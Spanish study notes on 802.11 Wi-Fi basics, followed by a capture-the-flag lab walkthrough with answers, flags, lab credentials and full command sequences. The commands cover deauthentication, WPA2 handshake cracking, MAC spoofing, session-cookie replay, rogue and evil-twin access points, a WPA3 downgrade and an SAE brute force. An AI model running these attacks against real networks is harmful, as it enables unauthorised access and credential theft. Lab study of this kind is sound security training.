
**¿Qué es la WIFI?**
Marca comercial, familia de estándares IEEE 802.11. Define cómo se comunican los dispositivos de forma inalámbrica en un WLAN. Cubre la capa física (PHY) - modulación, frecuencias, canales, potencia - y la capa de enlace (MAC) - direccionamiento, acceso al medio, tramas, seguridad
WIFI se comporta como Ethernet: IP, TCP/UDP, DHCP Y DNS

**COMPONENTES**
- STA: Cualquier dispositivo cliente
- Punto de Acceso (AP): Dispositivo que crea la red inalámbrica y la conecta a la cableada. Un router doméstico suele integrar el AP, router, switch, DHCP y firewall
- BSS: AP con sus clientes asociados
- BSSID: Identificador único del BSS, normalmente la MAC del AP
- SSID: Nombre de la red. Varios APs pueden compartirlo
- DS: Red cableada que conecta los APs entre sí.

**CAPA FÍSICA**
Bandas:
- 2,4 GHz: Más alcance y penetración pero poco ancho de banda e interferencias (microondas, Bluetooth).
- 5GHz : Más rápida, más canales y menos alcances. Algunos canales exigen DFS
- 6GHz : WIFI 6E Y 7. Mucho aspectro limpio, menor alcance

![[Pasted image 20261108182801.png]]
**CAPA MAC**
Aira = medio corpartido y half-duplex: Solo uno transmite a la vez en un canal. Wifi usa CSM/CA (evita colisiones, porque no puede detectarlas mientras transmite.)
La estación escucha el canal. Si está libre, espera un tiempo aleatorio (backoff). Transmite.
El receptor responde con ACK. Sin ACK, retransmite.
Opcionalmente se usa RTS/CTS para evitar el problema del nodo oculto

**TIPOS DE TRAMAS 802.11**
De Gestión:
- **Beacon:** el AP la emite periódicamente (~cada 100 ms) anunciando SSID, canales, velocidades soportadas, seguridad y capacidades.
- **Probe Request / Probe Response:** el cliente pregunta por redes (por SSID concreto o broadcast) y el AP responde.
- **Authentication:** primer paso del proceso de conexión (en WPA2 es “Open System”, una formalidad).
- **Association Request / Response:** el cliente se une formalmente al BSS.
- **Deauthentication / Disassociation:** terminan la conexión.
- **Action frames:** gestión de canales, roaming, etc.

De Control:
- **RTS, CTS, ACK**, que coordinan el acceso al medio.

De Datos
- Transportan el tráfico real (cifrado si la red tiene seguridad).

**CONEXIÓN DE UN CLIENTE**
1. **Descubrimiento:** escaneo pasivo (escucha beacons) o activo (envía probe requests).
2. **Autenticación 802.11:** intercambio básico, sin seguridad real en WPA2.
3. **Asociación:** el AP asigna un **AID** al cliente.
4. **Autenticación de seguridad:** el **4-way handshake** (WPA2/WPA3 Personal) o 802.1X/EAP (Enterprise).
5. **DHCP:** el cliente obtiene IP, máscara, gateway y DNS.
6. **Tráfico normal:** ARP, DNS, HTTP, etc.


WPA-PSK: WIFI a la que te conectas proporcionando una contraseña precombinada que es la misma para todos.
WPA-EAP: WIFI a la que te conectas poniendo contraseña y usuario, que se enviará a un servidor radius.
![[Pasted image 20261108184732.png]]
![[Pasted image 20261108184747.png]]

### **AIRCRACK-NG**

Herramienta para atacar redes wifi.
**airbase-ng** Herramienta multiusos orientada a atacar clientes en lugar del propio AP. **aircrack-ng** Crackea claves WEP y WPA/WPA2-PSK 802.11. 
**airdecap-ng** Descifra capturas WEP/WPA/WPA2. 
**airdecloak-ng** Elimina el WEP cloaking de un archivo de captura.
**airdrop-ng** Herramienta de desautenticación inalámbrica basada en reglas. 
**aireplay-ng** Inyecta y reproduce tramas inalámbricas. 
**airgraph-ng** Genera gráficos de redes inalámbricas. 
**airmon-ng** Activa y desactiva el modo monitor en interfaces inalámbricas. 
**airodump-ng** Captura tramas 802.11 en bruto. 
**airolib-ng** Precalcula contraseñas WPA/WPA2 en una base de datos para usarla con aircrack-ng. 
**airserv-ng** Servidor TCP/IP que permite a varias aplicaciones compartir una tarjeta inalámbrica. 
**airtun-ng** Crea interfaces de túnel virtual. 
**packetforge-ng** Crea paquetes cifrados para usarlos en inyección. 
**Otras herramientas** WZCook e ivstools. 
**besside-ng** Se comunica con un AP cifrado con WEP sin conocer la clave. 
**tkiptun-ng** Prueba de concepto del ataque WPA/TKIP mediante inyección de paquetes en redes con QoS. 
**wesside-ng** Automatiza varias técnicas para obtener una clave WEP en minutos.

### CTF

```bash
setxkbmap es
```

 **1. ¿Cuál es el canal que el AP wifi-global está utilizando actualmente?**
 La respuesta es: 44
 
 Con airmon-ng, ponemos la tarjeta de red en modo monitoreo: sudo airmon-ng start wlan0. Haciendo iwconfig wlan0mon, se confirma que está en modo monitor.
 Con airdump-ng capturamos paquetes -> sudo airodump-ng wlan0mon.
 No localizamos wifi-global, por lo que suponemos que utiliza otra banda. Vamos con el comando sudo airodump-ng wlan0mon --band abg
  F0:9F:C2:71:22:17  -28        5       33    0  44   54e  WPA2 CCMP   MGT  wifi-global 
  
**2.¿Cuál es la MAC del CLIENTE Wifi-IT?**
La respuesta es: 10:F9:6F:AC:53:52
  
Valdría en el primer comando. Lo ideal sería hacer una búsqueda más planificada con --chanel 11 o en base a BSSID. Observamos que hay dos tablas: La primera es la de las propias wifis y la de abajo la de los clientes. Localizamos BSSID de WIFI-IT en la tabla de arriba y la cotejamos con la de abajo.
 Tabla 1:  F0:9F:C2:1A:CA:25  -31       53        6    0  11   54e  WPA3 CCMP   SAE  wifi-IT         
 Tabla 2:  F0:9F:C2:1A:CA:25  10:F9:6F:AC:53:52  -30   54e-54e     4        7                             

**3. ¿Cuál es el "probe" de 78:C1:A7:BF:72:46?**
La respuesta es: wifi-offices  

Utilizando airpdump-ng wlan0mon --channel 11
 (not associated)   78:C1:A7:BF:72:46  -52    0 - 1      0       57         wifi-offices,Jason  
Intenta conectarse.
- **STATION**: la MAC del cliente.
- **PWR -52**: la señal es bastante buena, así que está cerca.
- **Rate 0 - 1**: el primer número es AP→cliente (0, porque no hay AP) y el segundo cliente→AP (1 Mbps, la velocidad mínima que se usa para los probe requests).
- **Frames 15**: ha enviado 15 tramas que has capturado.
- **Probes**: las redes que está buscando activamente.

**4. ¿Cuál es el ESSID del AP oculto (mac FO:9F:C2:6A:88:26)?**
La respuesta es: wifi-free

El ESSID es un SSID que se puede aplicar a muchos puntos de acceso.
Localizamos el canal en base a sudo airodump-ng --bssid F0:9F:C2:6A:88:26 wlan0mon
 F0:9F:C2:6A:88:26  -26 100      168        0    0  11   54   OPN              <length:  9>    
Cómo ningún cliente se conecta, hay que hacer un ataque de fuerza bruta para averiguar cual es el BSSID
Descargar rockyou.txt
sed -i 's/\b\w\+/wifi-&/g' rockyou.txt -> Ponemos WIFI- a todas las palabras de rockyou.txt
sudo mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f rockyou.txt 

**5. ¿Cuál es la flag en el router AP oculto tras las credenciales predeterminadas?**
La respuesta es: flag{680efaa62f7e953c24667285173711bc6bb6d3ff} 
(Supongo que cambiará en cada sesión)

 F0:9F:C2:6A:88:26  -26 100      387        0    0  11   54   OPN              <length:  9>    
Vemos que Wifi-free es OPN. No tiene contraseña
Nos conectamos a la red. Para ello usaremos wlan1 y no wlan0 porque está en modo monitor. 
sudo ip link set wlan1 up (Activamos la tarjeta. No sé si era necesario)
sudo iwconfig wlan1 essid wifi-free (wlan1 se asocia con la red. No tiene contraseña)
sudo dhclient wlan1 (pedir la IP)
ip addr show wlan1 (vemos la IP: 192.168.16.23)
sudo nmap -sn 192.168.16.0/24 (Tiramos un nmap para localizar el AP)
Entramos con el navegador y nos pide un usuario y contraseña. Probamos los que vienen por defecto admin/admin y entramos

**6. ¿Cuál es la flag en el router AP de la red wifi-guest?**

F0:9F:C2:71:22:10  -29        7        2    0   6   54   OPN              wifi-guest
Vemos que es OPN, de nuevo. No tiene contraseña.
Bien, seguimos los pasos del ejercicio anterior y vamos a dar con la ip. El problema es que al entrar nos encontramos con un usuario y contraseña que no descifro.
Como es opn, no tiene cifrado. Al hacer de nuevo el airodump-ng, observamos que tiene clientes que intentan conectarse. Vamos a guardar la captura y a buscarlo con wireshark para encontrar las credenciales válidas:
sudo airodump-ng wlan0mon --channel 6 --bssid F0:9F:C2:71:22:10 -w captura
Filtramos por peticiones POST y nos encontramos con: Username = free1, Password = Jyl1iq8UajZ1fEK
Cogemos el usuario 2: free2, 5LqwwccmTg6C39y
Bien, creo que no funciona pq mi mac y la del cliente no es la misma. 80:18:44:BF:72:47
sudo ip link set wlan2 down
sudo macchanger -m 80:18:44:BF:72:47 wlan2
sudo ip link set wlan2 up y volvemos a hacer la conexión. Cerramos la pestaña de chrome y al volver a entrar la página es distinta y ya nos deja acceder.

**7. ¿Cuál es la flag en el sitio web wifi-old?**
La respuesta: flag{763fde6ad2602841c2a465607cc2ef27f5f847c2}
 F0:9F:C2:71:22:11  -31        5       95   47   3   54   WEP  WEP         wifi-old            
Ya no es OPN. Requiere contraseña.
Se trata de cifrado WEP -  Débil. Podemos crackearlo 
Recopilamos con sudo airodump-ng wlan0mon  -w capturaOld ... y esperamos a que recoja muchas peticiones (sobre 25000 vale). Luego usamos 
sudo aircrack-ng capturaOld-01.cap, nos conectamos como arriba solo que poniendo el resultado de aircrack y seguimos los pasos hasta obtener la flag.

**28. ¿Cuál es la flag del AP de wifi-event?**
La respuesta es:

 F0:9F:C2:71:22:13  -28       17        0    0   8   54   WPA2 CCMP   PSK  wifi-event          
Cifrado con CCMP y PSK
CCMP: Cifra los datos transmitidos a través de aire para que nadie pueda interceptarlos y leerlos. Además añade una firma digital para garantizar que los paquetes no hayan sido manipulados.
PSK: Contraseña wifi = para todos los usuarios de la red.


**29**

**8. ¿Cuál es la contraseña del AP wifi-mobile?**
La respuesta es: starwars1

 F0:9F:C2:71:22:12  -26   0       17        2    0   6   54   WPA2 CCMP   PSK  wifi-mobile     
Ponemos a la escucha con airodump-ng guardandolo en un archivo. En otra terminal:
sudo aireplay-ng --deauth 10 -a F0:9F:C2:71:22:12 wlan0mon -> Ataque de seautenticación WiFi. Envia 10 paquetes que simulan ser órdenes del router para que los dispositivos se desconecten.
Desconexión de un dispositivo que inmediatamente intenta conectarse de nuevo. En ese momento se produce el handshake de WAP/WPA2. Se captura para realizar FB
sudo aircrack-ng capturaMobile-01.cap -w rockyou.txt

**9. ¿Cuál es la Ip del servidor web en la red wifi-mobile?**
La respuesta es: 192.168.2.1

sudo airdecap-ng -e wifi-mobile -p 'starwars1' capturaMobile-01.cap
(Con esto desciframos paquetes capturados cifrados por WEP o WPA usando la clave conocida)
Buscamos la ip resultante con wireshark
Por algún motivo, la captura no funcionaba bien y no se descifraba con el uso de airdecap. Al día siguiente hice otra y ya me funcionó a la primera

**10. ¿Cuál es la flag después de iniciar sesión en wifi-mobile?**
La respuesta es: flag{2d5931f342c034a7e9d69f97fe23d13121898bc8}

Creamos un nano wifi.conf
network={
        ssid="wifi-mobile"
        psk="starwars1"
        key_mgmt=WPA-PSK
        proto=WPA2
}

sudo wpa_supplicant -Dnl80211 -i wlan4 -c wifi.conf (Escanea, encuentra AP wifi-mobile y realiza el proceso de autenticación para asociarse a la red)
sudo dhclient wlan4 -v (Obtenemos la dirección ip (se podría haber hecho como en el anterior. Ya la tenemos de ahí))
tshark -r limpia-01-dec.cap -Y "http" -T fields -e frame.number -e http.cookie -e http.set_cookie (Buscar la cookie. Valdría tb usuario y contraseña que creo que también hay)
curl -v -H "Cookie: PHPSESSID=42fb5b175b96b9d5a7da759f018fc7b8" http://192.168.2.1/lab.php (curl a la web con la cookie robada. Acceso)

**11. ¿Existe isolation en wifi-mobile?**
La respuesta es: flag{edfdf342848f5559bce9750c98b7018da3d9270e}

Isolation es una función de seguridad que impide que los dispositivos conectados a una misma wifi tengan comunicación directa. Cada cliente debe pasar por el router.
Haciendo un sudo nmap -sn 192.168.2.0/24 simplemente vemos que el escaneo muestra dos dispositivos .7 y el .8. Si accedemos a su ip, obtenemos ya la flag.
En la solución oficial utiliza sudo arp-scan -I wlan4 -l

**12. ¿Cuál es la contraseña de wifi-offices?**
La respuesta es: password1

Al realizar el airodump, no encuentro el Ap, pero sí hay clientes intentado establecer conexión con ella. Para obtener la contraseña podría montar un AP falso con el mismo SSID para capturar el handshake
 (not associated)   78:C1:A7:BF:72:46  -52    0 - 1     33        6         wifi-offices,Jason  
 (not associated)   B4:99:BA:6F:F9:45  -50    0 - 1     33        6         wifi-offices,Jason 
nano host.conf
interface=wlan0mon
driver=nl80211
ssid=wifi-offices
hw_mode=g
channel=1 (canal por el que operará el AP)
mana_wpaout=hostapd.hccapx (donde se guardarán los handshakes capturados)
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
(simula una seguridad que fuerza al intercambio de claves cuando los clientes se conecten)

sudo hostapd-mana host.conf (Inicia el ap)

Metemos el hash en un archivo. En este caso lo llamaré hash.txt

hashcat -a 0 -m 22000 hash.txt ~/Downloads/rockyou.txt --show (-m 22000 es el modo moderno optimizado para hashes WAP/WPA-PSK)

**13. ¿Cuál es la flag del AP de wifi-management?**
La respuesta es: flag{a192e7909455cb1ffd1d2355e70e2ef0f4ccc811}

 F0:9F:C2:11:0A:24  -29        5        0    0  11   54e  WPA3 CCMP   SAE  wifi-management     
Nos encontramos con que ahora es WPA3, por lo que los métodos de explotación serán distintos.
Wacker es una herramienta diseñada para realizar ataques a WPA3 mediante el protocolo SAE. cd ~/tools/wacker
sudo ./wacker.py --wordlist ~/Downloads/rockyou.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462
La frecuencia la saco del canal. Como es channel 11 -> 2462 (es una tabla de valores)
sudo iwlist wlan2 scan | grep -E "Address|ESSID|Frequency|Channel" (aquí lo tengo)
sudo wpa_supplicant -i wlan2 -c wpa3.conf -B
sudo dhclient wlan2 -v
Obtenemos la ip y ya tenemos la flag

**14. ¿Cuál es la flag en el AP de Wifi-It?**
La respuesta es: flag{f4629b4c22636fa0ae72eb5d1cf9caf88b4ecbee}

 F0:9F:C2:1A:CA:25  -31       10        0    0  11   54e  WPA3 CCMP   SAE  wifi-IT             
Observamos que, a diferencia del ejemplo de arriba, tiene un cliente 
 F0:9F:C2:1A:CA:25  10:F9:6F:AC:53:52  -30   54e-54e     0        2                             
Utilizaré la opción de degradarlo. Obligarlo a conectarse de nuevo a RogueAp con WPA2
Abrimos con cat el archivo .csv que pillamos con el airodump
BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power,>
F0:9F:C2:1A:CA:25, 2026-11-11 13:53:13, 2026-11-11 13:53:45, 11,  54, WPA3 WPA2, CCMP, SAE PSK,>

Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs
10:F9:6F:AC:53:52, 2026-11-11 13:53:27, 2026-11-11 13:53:41, -30,        4, F0:9F:C2:1A:CA:25,
Observamos que tiene SAE PASK -> Posiblemente acepte psk
nano host.conf
interface=wlan1
driver=nl80211
ssid=wifi-IT
hw_mode=g
channel=1
mana_wpaout=hostapd2.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678

sudo hostapd-mana host.conf
sudo iwconfig wlan0mon channel 11
sudo aireplay-ng --deauth 0 -a F0:9F:C2:1A:CA:25 -c 10:F9:6F:AC:53:52 wlan0mon
En la terminal del hostapd-mana obtenemos los hashs. Para no andar con complicaciones, los metemos a un archivo con echo llamado hash.22000
hashcat -a 0 -m 22000 hash.22000 ~/Downloads/rockyou.txt --force
nano wifi.conf
network={
    ssid="wifi-IT"
    psk="bubblegum"
    key_mgmt=SAE
}
sudo wpa_supplicant -B -i wlan1 -c wifi.conf
sudo dhclient wlan1 -v

**15. ¿Cuál es el dominio de los usuarios de wifi-regional?**
La respuesta es: flag{CONTOSOREG}

Haciendo búsqueda normal, solo hay un cliente que intenta conectarse
 (not associated)   64:32:A8:AC:53:50  -23    0 - 1     12        6         wifi-regional   

sudo airodump-ng wlan0mon -c 44

  F0:9F:C2:71:22:16  -26   0      166       37    0  44   54e  WPA2 CCMP   MGT         wifi-regional  
                                                                                                       
MGT -> Management. Autenticación tipo empresarial. Credenciales individuales, servidor RADIUS (AP no valida la contraseña. Deriva la autenticación a servidor radius) y túnel EAP (TÚNEL CIFRADO para validar credenciales)
Al parecer, si los usuarios están mal configurados, se puede obtener el dominio porque se envía primero antes de que aparezca el túnel.

Poner en el buscador de wireshark eap y buscar los paquetes de identity en el apartado info, más concretamente los response. Ver cuidadosamente si la mac coincide con la de wifi-regional. Si no, será de otra wifi

**16. ¿Cuál es la dirección de email del certificado del servidor?**
La respuesta es:

Entiendo que se sigue sobre el mismo .cap de wifi-regional. AP envía un certificado en texto plano -> Podemos falsificar certificados o conocer información.
Abrimos la captura con wireshark
Filtramos por handshake tls -> tls.handshake.type == 11
Cogemos el paquete de certificate hello/done
Dentro dle paquete exploramos el tls handshake protocol certificate y ya aparece

bash pcapFilter.sh -f ~/wifiRegional-04.cap -C Saca la información directamente:
        Subject: C = ES, ST = Madrid, L = Madrid, O = WiFiChallenge, OU = Server, CN = radius.wifichallenge.com, emailAddress = server@WiFiChallenge.com
el ca@wifichallenge.com es el email asociado a l certificado, no del servidor
WiFiChallenge CA (ca@WiFiChallenge.com)
        │
        │ firma
        ▼
radius.wifichallenge.com (server@WiFiChallenge.com)   ← este es el "certificado del servidor"

**17. ¿Cuál es el metodo EAP admitido por el AP de wifi-global?**
La respuesta es: EAP-TLS

Utilizaremos la herramienta EAP_buster. Básicamente muestra los métodos compatibles con el servidor RADIUS detrás de un AP WPA-Enterprise.
sudo airodump-ng wlan0mon --channel 44
 F0:9F:C2:71:22:17  -28   0      100      196    2  44   54e  WPA2 CCMP   MGT  wifi-global     
EAP_buster.sh <EAP_ESSID> <EAP_identity> <wifi_interface>
La identidad es lo que hicimos en el 15.
Airodump -w, filtro eap con el bssid en wireshark
eap && wlan.bssid == f0:9f:c2:71:22:17
GLOBAL\GlobalAdmin
bash ./EAP_buster.sh wifi-global 'GLOBAL\GlobalAdmin' wlan2
A mi no me ha funcionado. Ha sido cuestión de probar los tipos. Mirando walkthought hace lo mismo pero nada, no consigo replicarlo.

**18. ¿Cuál es la flag de Juan en la AP de wifi-corp?**
La respuesta es:

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 F0:9F:C2:71:22:15  -22   0      227       57    0  44   54e  WPA2 CCMP   MGT  wifi-corp       

 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes

 F0:9F:C2:71:22:15  64:32:A8:07:6C:40  -24   54e- 6e     0       17                             
 F0:9F:C2:71:22:15  64:32:A8:BA:6C:41  -26   12e-24e     0       47  PMKID  

Como se puede ver, wifi-corp tiene MGT. Vamo a atacar al cliente Juan, así que hay que falsificar un AP que tenga el mismo essid. Como es un MGT, también hay que falsificar un certificado (herramienta eaphammer)
sudo ./eaphammer --cert-wizard
Bien. Entiendo que tenemos que hacer un certificado con los mismos datos
Airodump, aireplay y pasamos a wireshark.
Ahí seguir los pasos del 16:
tls.handshake.type == 11
server hello done
TLS: Certificate. Abrimos certificates, subject: rdnSequence y ahi vamos abriendo todos los datos
sudo python3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced
